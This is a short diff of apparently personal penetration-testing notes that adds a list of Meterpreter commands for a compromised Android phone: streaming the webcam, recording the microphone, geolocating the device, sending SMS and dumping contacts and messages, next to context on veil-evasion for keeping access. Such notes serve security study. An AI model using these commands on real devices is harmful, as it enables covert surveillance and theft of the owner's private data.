@@ -123,6 +123,18 @@ learned before and execute it.
 	- record_mic -h
 	- run webcam -h
 
+Meterpreter Android:
+- use help and look at Stdapi: Webcam Commands and Android Commands
+- webcam
+	- webcam list
+	- webcam_stream 2
+- record_mic
+	- record_mic -h
+- geolocate
+- send_sms -h
+- dump_contacts
+- dump_sms
+
 ## Maintaining Access (Post Explotation):
 - Using a veil-evasion
 	- Rev_http_service
